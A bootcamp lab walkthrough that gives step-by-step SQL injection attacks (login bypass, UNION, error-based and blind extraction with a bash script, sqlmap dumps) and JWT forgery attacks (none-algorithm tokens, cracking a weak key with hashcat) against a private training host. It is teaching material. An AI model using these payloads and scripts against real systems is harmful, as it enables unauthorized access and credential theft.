# SQL Injection & JWT Labs Walkthrough

> **Lab URL:** http://10.10.61.221
> **Last Verified:** March 2026

---

## SQL Injection Labs

### Employee Login - Login Bypass (`/resources/login.php`)

**Objective:** Bypass authentication without knowing the password

**Test Steps:**
1. Go to http://10.10.61.221/resources/login.php
2. Enter username: `admin'-- -`
3. Enter any password: `x`
4. Click Login

**Expected Result:** "Login Successful - Welcome, admin!"

**Why it works:** The query becomes:
```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='x'
```
Everything after `--` is a comment, so password check is ignored.

---

### Member Directory - UNION Injection (`/resources/directory.php`)

**Objective:** Extract data from `secret_data` table using UNION-based SQL injection

---

#### Step 1: Open the page and test normal input

1. Go to http://10.10.61.221/resources/directory.php
2. Enter ID: `1` and click Search
3. You should see: **John Doe** from Engineering

This confirms the page works normally.

---

#### Step 2: Test for SQL injection vulnerability

1. Enter ID: `1'` (with a single quote)
2. Click Search

**Expected Result:** SQL syntax error:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax...
```

The single quote breaks the SQL query, confirming the page is **vulnerable**.

---

#### Step 3: Find the number of columns

For UNION to work, we need to match the number of columns in the original query.

**Method 1: ORDER BY**
```
1 ORDER BY 1    → Works
1 ORDER BY 2    → Works
1 ORDER BY 3    → Works
1 ORDER BY 4    → Works
1 ORDER BY 5    → Error!
```
This means the table has **4 columns**.

**Method 2: UNION SELECT**
```
0 UNION SELECT 1,2,3      → Error (wrong column count)
0 UNION SELECT 1,2,3,4    → Works! Shows 1, 2, 3 in the table
```

---

#### Step 4: Identify which columns are displayed

Enter ID: `0 UNION SELECT 1,2,3,4`

**Result:** The page shows:
| ID | Name | Email | Department |
|----|------|-------|------------|
| 1 | 2 | 3 | (badge) |

This tells us:
- Column 1 → ID field
- Column 2 → Name field (displayed)
- Column 3 → Email field (displayed)
- Column 4 → Department badge

We can inject data into columns 2 and 3 to see the output!

---

#### Step 5: Extract database information

**Get MySQL version:**
```
0 UNION SELECT 1,version(),3,4
```
Result: Shows MySQL version in the Name column (e.g., `8.0.45`)

**Get current database:**
```
0 UNION SELECT 1,database(),3,4
```
Result: `leaguesofcode_db`

**Get current user:**
```
0 UNION SELECT 1,user(),3,4
```
Result: `locadmin@localhost`

---

#### Step 6: Discover tables in the database

```
0 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='leaguesofcode_db'
```

**Result:** Shows all tables:
- `users`
- `members`
- `secret_data` ← This looks interesting!
- `inventory`
- `partners`
- `books`
- `accounts`

---

#### Step 7: Discover columns in secret_data table

```
0 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secret_data'
```

**Result:** Shows columns:
- `id`
- `data_type`
- `data_value`

---

#### Step 8: Extract the secrets!

Now we know the table structure, extract the data:

```
0 UNION SELECT 1,data_type,data_value,4 FROM secret_data
```

**Final Result - Extracted Secrets:**

| Data Type | Value |
|-----------|-------|
| `admin_pin` | **1337** |
| `api_key` | **sk_live_abc123xyz789** |
| `db_password` | **sup3rs3cr3tDBp@ss** |
| `encryption_key` | **AES256_K3Y_2026!** |

---

#### Summary - Final Payload

**URL to paste in browser:**
```
http://10.10.61.221/resources/directory.php?id=0 UNION SELECT 1,data_type,data_value,4 FROM secret_data
```

**Payload Explanation:**
- `0` - Returns no valid member (so UNION results show)
- `UNION SELECT` - Appends our malicious query
- `1,data_type,data_value,4` - Matches 4 columns, puts data in visible columns
- `FROM secret_data` - Target table with sensitive information

---

### Book Catalog - Error-Based Injection (`/resources/catalog.php`)

**Objective:** Extract data using error-based SQL injection with `extractvalue()`

---

#### Step 1: Open the page and test normal input

1. Go to http://10.10.61.221/resources/catalog.php
2. Enter bookID: `1` and click Search
3. You should see: **Clean Code** by Robert C. Martin

This confirms the page works normally.

---

#### Step 2: Test for SQL injection vulnerability

1. Enter bookID: `1'` (with a single quote)
2. Click Search

**Expected Result:** SQL syntax error with details:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax...
near ''1''' at line 1
```

The page shows **detailed error messages** - perfect for error-based injection!

---

#### Step 3: Understand the extractvalue() technique

The `extractvalue()` function in MySQL is used for XML parsing. When given invalid XML, it throws an error **containing the data we want to extract**.

**Syntax:**
```sql
extractvalue(rand(), concat(0x3a, <OUR_QUERY>))
```

- `rand()` - dummy XML value (always invalid)
- `concat(0x3a, ...)` - prepends `:` (hex 0x3a) to make output visible
- Error format: `XPATH syntax error: ':<extracted_data>'`

---

#### Step 4: Extract MySQL version

Enter bookID:
```
1' AND extractvalue(rand(),concat(0x3a,version())) -- -
```

**Result:**
```
XPATH syntax error: ':8.0.45'
```

We extracted the MySQL version through the error message.

---

#### Step 5: Extract database name

Enter bookID:
```
1' AND extractvalue(rand(),concat(0x3a,database())) -- -
```

**Result:**
```
XPATH syntax error: ':leaguesofcode_db'
```

---

#### Step 6: Extract current user

Enter bookID:
```
1' AND extractvalue(rand(),concat(0x3a,user())) -- -
```

**Result:**
```
XPATH syntax error: ':locadmin@172.18.0.x'
```

---

#### Step 7: Extract table names

To find tables, use `information_schema.tables` with LIMIT to get one at a time:

```
1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema='leaguesofcode_db' LIMIT 0,1))) -- -
```

Change `LIMIT 0,1` to `LIMIT 1,1`, `LIMIT 2,1`, etc. to get each table:

| LIMIT | Table Found |
|-------|-------------|
| 0,1 | `accounts` |
| 1,1 | `books` |
| 2,1 | `flag` |
| 3,1 | `inventory` |
| 4,1 | `members` |
| 5,1 | `partners` |
| 6,1 | `secret_data` |

---

#### Step 8: Extract secrets from secret_data

**Get admin_pin:**
```
1' AND extractvalue(rand(),concat(0x3a,(SELECT data_value FROM secret_data WHERE data_type='admin_pin'))) -- -
```
**Result:** `XPATH syntax error: ':1337'`

**Get api_key:**
```
1' AND extractvalue(rand(),concat(0x3a,(SELECT data_value FROM secret_data WHERE data_type='api_key'))) -- -
```
**Result:** `XPATH syntax error: ':sk_live_abc123xyz789'`

**Get db_password:**
```
1' AND extractvalue(rand(),concat(0x3a,(SELECT data_value FROM secret_data WHERE data_type='db_password'))) -- -
```
**Result:** `XPATH syntax error: ':sup3rs3cr3tDBp@ss'`

**Get encryption_key (using LIMIT):**
```
1' AND extractvalue(rand(),concat(0x3a,(SELECT data_value FROM secret_data LIMIT 3,1))) -- -
```
**Result:** `XPATH syntax error: ':AES256_K3Y_2026!'`

---

#### Summary - Extracted Secrets

| Data Type | Value |
|-----------|-------|
| `admin_pin` | **1337** |
| `api_key` | **sk_live_abc123xyz789** |
| `db_password` | **sup3rs3cr3tDBp@ss** |
| `encryption_key` | **AES256_K3Y_2026!** |

---

#### Key Payloads Reference

| Purpose | Payload |
|---------|---------|
| MySQL version | `1' AND extractvalue(rand(),concat(0x3a,version())) -- -` |
| Database name | `1' AND extractvalue(rand(),concat(0x3a,database())) -- -` |
| Current user | `1' AND extractvalue(rand(),concat(0x3a,user())) -- -` |
| Table names | `1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) -- -` |
| Extract data | `1' AND extractvalue(rand(),concat(0x3a,(SELECT column FROM table WHERE condition))) -- -` |

**Note:** `extractvalue()` has a ~32 character output limit. For longer data, use `SUBSTRING(data,1,30)` to extract in chunks.

---

### Partner Verification - Blind SQL Injection (`/resources/verify.php`)

**Objective:** Extract data using boolean-based blind injection

---

#### Step 1: Open the page and understand the responses

1. Go to http://10.10.61.221/resources/verify.php
2. Enter code: `LOC001` → Shows **"Partner Verified"** ✓
3. Enter code: `XXXXX` → Shows **"Partner Not Found"** ✗

**Key Observation:** The page gives two different responses:
- Valid partner → "Partner Verified" (TRUE)
- Invalid partner → "Partner Not Found" (FALSE)

This is the basis of **blind SQL injection** - we can ask yes/no questions!

---

#### Step 2: Test for SQL injection vulnerability

Test if we can control TRUE/FALSE with injected conditions:

**Test TRUE condition:**
```
LOC001' AND '1'='1
```
**Result:** "Partner Verified" ✓ (because 1=1 is TRUE)

**Test FALSE condition:**
```
LOC001' AND '1'='2
```
**Result:** "Partner Not Found" ✗ (because 1=2 is FALSE)

**Vulnerable!** We can inject conditions and see the result based on the response.

---

#### Step 3: Understand Blind Injection technique

In blind SQL injection, we can't see data directly. Instead, we:
1. Ask **yes/no questions** about the data
2. Infer the answer from TRUE/FALSE responses
3. Extract data **one character at a time**

**Key function:** `SUBSTRING(string, position, length)`
- `SUBSTRING(secret_key, 1, 1)` = first character
- `SUBSTRING(secret_key, 2, 1)` = second character
- etc.

---

#### Step 4: Check if secret_key column exists

```
LOC001' AND SUBSTRING(secret_key,1,1)>'@
```

**Result:** "Partner Verified" → The column exists and has data!

---

#### Step 5: Extract first character of secret_key

Try different characters until we get "Partner Verified":

```
LOC001' AND SUBSTRING(secret_key,1,1)='a    → Not Found
LOC001' AND SUBSTRING(secret_key,1,1)='b    → Not Found
...
LOC001' AND SUBSTRING(secret_key,1,1)='s    → Partner Verified ✓
```

**Found!** First character is **'s'**

---

#### Step 6: Extract full secret_key (manual method)

Continue for each position:

| Position | Payload | Result |
|----------|---------|--------|
| 1 | `SUBSTRING(secret_key,1,1)='s'` | ✓ Found: **s** |
| 2 | `SUBSTRING(secret_key,2,1)='3'` | ✓ Found: **3** |
| 3 | `SUBSTRING(secret_key,3,1)='c'` | ✓ Found: **c** |
| 4 | `SUBSTRING(secret_key,4,1)='r'` | ✓ Found: **r** |
| 5 | `SUBSTRING(secret_key,5,1)='3'` | ✓ Found: **3** |
| 6 | `SUBSTRING(secret_key,6,1)='t'` | ✓ Found: **t** |
| 7 | `SUBSTRING(secret_key,7,1)='P'` | ✓ Found: **P** |
| 8 | `SUBSTRING(secret_key,8,1)='@'` | ✓ Found: **@** |
| 9 | `SUBSTRING(secret_key,9,1)='s'` | ✓ Found: **s** |
| 10 | `SUBSTRING(secret_key,10,1)='s'` | ✓ Found: **s** |

**Extracted:** `s3cr3tP@ss`

---

#### Step 7: Automated extraction script (Bash)

For faster extraction, use this script:

```bash
#!/bin/bash
# Blind SQLi character extraction script

TARGET="http://10.10.61.221/resources/verify.php"
PARTNER="LOC001"
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@!#\$%^&*_-"

secret=""
for pos in $(seq 1 15); do
  found=0
  for char in $(echo "$CHARSET" | grep -o .); do
    result=$(curl -s "$TARGET?code=$PARTNER'%20AND%20SUBSTRING(secret_key,$pos,1)='$char")
    if echo "$result" | grep -q "Partner Verified"; then
      secret="${secret}${char}"
      echo "Position $pos: '$char' → Current: $secret"
      found=1
      break
    fi
  done
  if [ $found -eq 0 ]; then
    echo "Extraction complete!"
    break
  fi
done
echo "SECRET KEY: $secret"
```

---

#### Step 8: Extract all partner secrets

Apply the same technique to other partners:

**LOC002:**
```
LOC002' AND SUBSTRING(secret_key,1,1)='p    → ✓
LOC002' AND SUBSTRING(secret_key,2,1)='@    → ✓
...
```

**LOC003:**
```
LOC003' AND SUBSTRING(secret_key,1,1)='c    → ✓
LOC003' AND SUBSTRING(secret_key,2,1)='l    → ✓
...
```

---

#### Summary - Extracted Partner Secrets

| Partner Code | Secret Key |
|--------------|------------|
| LOC001 | **s3cr3tP@ss** |
| LOC002 | **p@ssw0rd123** |
| LOC003 | **cl0udK3y!** |

---

#### Key Payloads Reference

| Purpose | Payload |
|---------|---------|
| Test TRUE | `LOC001' AND '1'='1` |
| Test FALSE | `LOC001' AND '1'='2` |
| Check column exists | `LOC001' AND SUBSTRING(secret_key,1,1)>'@` |
| Extract char at position N | `LOC001' AND SUBSTRING(secret_key,N,1)='x` |
| Check string length | `LOC001' AND LENGTH(secret_key)=10` |

**Note:** Blind injection is slow (one character at a time) but works when there's no visible output. Tools like `sqlmap` can automate this process.

---

### Library Books - SQLMap Practice (`/resources/books.php`)

**Objective:** Use SQLMap to automate extraction

**Manual Test Steps:**
1. Go to http://10.10.61.221/resources/books.php
2. Enter ID: `1` → Shows "Clean Code" book
3. Enter ID: `1 UNION SELECT 1,2,3,4,5,6` → Shows numbers in output

**SQLMap Commands:**
```bash
# Discover databases
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" --dbs

# List tables in leaguesofcode_db
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" -D leaguesofcode_db --tables

# Dump secret_data table
sqlmap -u "http://10.10.61.221/resources/books.php?id=1" -D leaguesofcode_db -T secret_data --dump
```

---

## JWT Labs (`/account/`)

### JWT None Algorithm Attack (`/account/portal.php`)

**Objective:** Bypass JWT signature verification and gain admin access

---

#### Step 1: Login and capture the JWT token

1. Go to http://10.10.61.221/account/signin.php
2. Login with credentials:
   - Username: `john`
   - Password: `password123`
3. After login, the server sets a cookie `auth_token` containing your JWT

**Test Accounts:**
| Username | Password | Role |
|----------|----------|------|
| john | password123 | user |
| wiener | peter | user |
| admin | admin | administrator |

**Capture the token:**
- Open DevTools (F12) → Application → Cookies
- Or check the `Set-Cookie` header in Network tab

**Example Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6InVzZXIiLC...
```

---

#### Step 2: Understand JWT structure

A JWT has **3 parts** separated by dots: `HEADER.PAYLOAD.SIGNATURE`

**Decode each part** (Base64):

| Part | Encoded | Decoded |
|------|---------|---------|
| Header | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` | `{"alg":"HS256","typ":"JWT"}` |
| Payload | `eyJzdWIiOjIsInVzZXIi...` | `{"sub":2,"user":"john","role":"user",...}` |
| Signature | `VLvS_U4Jmub...` | HMAC-SHA256 hash |

**Key observation:** The payload contains `"role":"user"` - we want `"role":"administrator"`!

**Decode with bash:**
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}
```

**Or use https://jwt.io** - paste the full token to decode all parts.

---

#### Step 3: Identify the vulnerability

Visit `/account/portal.php` with your token:
- You see the dashboard with role badge: **user** (blue)
- No Admin Panel access

**The vulnerability:** The server **does NOT verify the JWT signature**. It only:
1. Decodes the Base64 payload
2. Trusts whatever is in the payload

This means we can:
1. Change the algorithm to `"none"` (no signature required)
2. Modify the payload (change role)
3. Remove the signature entirely

---

#### Step 4: Create the forged JWT header

Change algorithm from `HS256` to `none`:

**Original Header:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Forged Header:**
```json
{"alg":"none","typ":"JWT"}
```

**Encode to Base64:**
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
```

Remove the `=` padding: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

---

#### Step 5: Create the forged JWT payload

Change role from `user` to `administrator`:

**Original Payload:**
```json
{"sub":2,"user":"john","role":"user","email":"john@leaguesofcode.com",...}
```

**Forged Payload:**
```json
{"sub":2,"user":"john","role":"administrator","email":"john@example.com","iat":1772823972,"exp":1872827572}
```

**Encode to Base64:**
```bash
echo -n '{"sub":2,"user":"john","role":"administrator","email":"john@example.com","iat":1772823972,"exp":1872827572}' | base64
```

**Result:** `eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0`

---

#### Step 6: Combine into forged token

Format: `HEADER.PAYLOAD.` (empty signature after the last dot)

**Forged Token:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0.
```

**Note:** The token ends with a dot (`.`) - the signature part is empty!

---

#### Step 7: Use the forged token in browser

**Method 1: DevTools**
1. Open browser DevTools (F12)
2. Go to **Application** → **Cookies** → `http://10.10.61.221`
3. Find `auth_token` cookie
4. Double-click and replace the value with the forged token
5. Refresh the page

**Method 2: Browser Console**
```javascript
document.cookie = "auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0.; path=/";
location.reload();
```

---

#### Step 8: Verify admin access

After refreshing with the forged token:

| Before (user) | After (administrator) |
|---------------|----------------------|
| Badge: **user** (blue) | Badge: **administrator** (gold) |
| No Admin Panel | **Admin Panel** visible |
| Limited access | Full access |

**Admin Panel shows:**
- "Welcome, Administrator!"
- Total Users: 156
- Active Sessions: 23
- **Server Key: `MASTER_KEY_2026`** ← This is the flag!

---

#### Step 9: Verify with curl

```bash
FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0."

curl -s "http://10.10.61.221/account/portal.php" \
  -b "auth_token=$FORGED_TOKEN" | grep -o "MASTER_KEY_2026\|administrator"
```

**Expected output:**
```
administrator
MASTER_KEY_2026
```

---

#### Summary - JWT None Algorithm Attack

| Step | Action |
|------|--------|
| 1 | Login as `john` / `password123` |
| 2 | Capture JWT token from cookie |
| 3 | Decode: role is `user` |
| 4 | Create new header: `alg: none` |
| 5 | Create new payload: `role: administrator` |
| 6 | Combine: `header.payload.` (empty signature) |
| 7 | Replace cookie with forged token |
| 8 | Access Admin Panel |

**Flag:** `MASTER_KEY_2026`

---

## JWT Weak Key Challenge (`/account/secure.php`)

**Objective:** Crack the weak JWT signing key and forge a valid admin token

**Difference from None Algorithm Attack:**
- `/account/portal.php` - Does NOT verify signature (none algorithm works)
- `/account/secure.php` - DOES verify signature (must crack the key)

---

#### Step 1: Get a valid JWT token

1. Go to http://10.10.61.221/account/secure.php
2. Login with `john / password123`
3. Copy the JWT token from the cookie

---

#### Step 2: Save token for cracking

```bash
# Save the JWT token to a file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20ifQ.SIGNATURE_HERE" > jwt.txt
```

---

#### Step 3: Crack the key with hashcat

```bash
# JWT mode is 16500
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Or use john the ripper
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

**Result:** The secret key is **`secret1`**

---

#### Step 4: Forge admin token with cracked key

Use Python to create a properly signed token:

```python
import jwt

# Cracked secret key
SECRET = "secret1"

# Admin payload
payload = {
    "sub": 2,
    "user": "john",
    "role": "administrator",
    "email": "john@leaguesofcode.com"
}

# Create signed token
token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

Or use https://jwt.io:
1. Paste original token
2. Change `role` to `administrator`
3. Enter `secret1` in the signature field
4. Copy the new signed token

---

#### Step 5: Create forged token with OpenSSL (alternative)

If Python is not available, use OpenSSL:

```bash
# Header and Payload
HEADER='{"alg":"HS256","typ":"JWT"}'
HEADER_B64=$(echo -n "$HEADER" | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')

PAYLOAD='{"sub":2,"user":"john","role":"administrator","email":"john@leaguesofcode.com","iat":1772825267,"exp":1872828867}'
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')

# Sign with secret1
MESSAGE="${HEADER_B64}.${PAYLOAD_B64}"
SIGNATURE=$(echo -n "$MESSAGE" | openssl dgst -sha256 -hmac "secret1" -binary | base64 -w0 | tr '+' '-' | tr '/' '_' | tr -d '=')

# Full token
echo "${MESSAGE}.${SIGNATURE}"
```

---

#### Step 6: Access admin panel

**Important:** The cookie name for this lab is `auth_token_secure` (not `auth_token`)

1. Set the forged token as `auth_token_secure` cookie
2. Visit http://10.10.61.221/account/admin.php
3. You should see the admin dashboard

**Browser Console method:**
```javascript
document.cookie = "auth_token_secure=YOUR_FORGED_TOKEN; path=/";
location.href = "/account/admin.php";
```

**Curl verification:**
```bash
FORGED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20iLCJpYXQiOjE3NzI4MjUyNjcsImV4cCI6MTg3MjgyODg2N30.V_-bEhkxlhy9LBjlyvcAzrKngLH3-z3tNFC6u8at7uE"

curl -s "http://10.10.61.221/account/admin.php" \
  -b "auth_token_secure=$FORGED_TOKEN" | grep "JWT_WEAK_KEY_CRACKED"
```

**Flag:** `JWT_WEAK_KEY_CRACKED_2026`

---

#### Summary - JWT Weak Key Attack

| Item | Value |
|------|-------|
| Lab URL | `/account/secure.php` |
| Admin URL | `/account/admin.php` |
| Cookie Name | `auth_token_secure` |
| Secret Key | `secret1` |
| Flag | `JWT_WEAK_KEY_CRACKED_2026` |

---

#### Why This Works

| Vulnerability | Explanation |
|--------------|-------------|
| Weak Secret Key | `secret1` is in common wordlists |
| No Key Rotation | Same key used for all tokens |
| Predictable Algorithm | HS256 is crackable with known-plaintext |

**Remediation:**
- Use strong random keys (256+ bits)
- Use asymmetric algorithms (RS256) for better security
- Implement key rotation

---

## Quick Verification Commands

Run these from terminal to verify labs are working:

```bash
# Login bypass
curl -s 'http://10.10.61.221/resources/login.php' \
  -d "username=admin'-- -&password=x" | grep "Welcome"

# UNION - Extract secrets
curl -s 'http://10.10.61.221/resources/directory.php?id=0%20UNION%20SELECT%201,data_type,data_value,4%20FROM%20secret_data'

# Error-based - extractvalue()
curl -s 'http://10.10.61.221/resources/catalog.php?bookID=1%27%20AND%20extractvalue(rand(),concat(0x3a,version()))%20--%20-'

# Blind injection TRUE
curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='1" | grep "Verified"

# Blind injection FALSE
curl -s "http://10.10.61.221/resources/verify.php?code=LOC001'%20AND%20'1'='2" | grep "Not Found"

# JWT None Algorithm - Admin access with tampered token
curl -s 'http://10.10.61.221/account/portal.php' \
  -b 'auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AZXhhbXBsZS5jb20iLCJpYXQiOjE3NzI4MjM5NzIsImV4cCI6MTg3MjgyNzU3Mn0.' \
  | grep "MASTER_KEY"

# JWT Weak Key - Admin access with cracked key token
curl -s 'http://10.10.61.221/account/admin.php' \
  -b 'auth_token_secure=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInVzZXIiOiJqb2huIiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJlbWFpbCI6ImpvaG5AbGVhZ3Vlc29mY29kZS5jb20iLCJpYXQiOjE3NzI4MjUyNjcsImV4cCI6MTg3MjgyODg2N30.V_-bEhkxlhy9LBjlyvcAzrKngLH3-z3tNFC6u8at7uE' \
  | grep "JWT_WEAK_KEY_CRACKED"
```

---

## Summary of Flags/Secrets

| Lab | Secret to Extract |
|-----|-------------------|
| Employee Login | Bypass login as `admin` |
| Member Directory | `admin_pin: 1337`, `api_key: sk_live_abc123xyz789`, `db_password: sup3rs3cr3tDBp@ss` |
| Book Catalog | Extract data via `extractvalue()` errors |
| Partner Verification | Partner secret keys: `s3cr3tP@ss`, `p@ssw0rd123`, `cl0udK3y!` |
| Library Books | All tables via SQLMap |
| JWT (None Algorithm) | Server Key: **`MASTER_KEY_2026`** |
| JWT (Weak Key) | Flag: **`JWT_WEAK_KEY_CRACKED_2026`** |

---

## Troubleshooting

**Lab not loading?**
```bash
# Check if containers are running
ssh -J root-agent@100.107.182.15 loc@10.10.61.221 "docker ps"

# Restart all services
ssh -J root-agent@100.107.182.15 loc@10.10.61.221 "cd /home/loc/HackdayBc && docker-compose restart"
```

**JWT cookie not saving?**
- Make sure you're on the same domain (10.10.61.221)
- Check DevTools Console for errors
- Try incognito/private browsing mode

**SQL injection not working?**
- Check for typos in payloads
- Try URL encoding special characters: `'` = `%27`, space = `%20`
- Use browser DevTools Network tab to see actual requests

---

*Created for LeaguesOfCode Cybersecurity Bootcamp 2026*
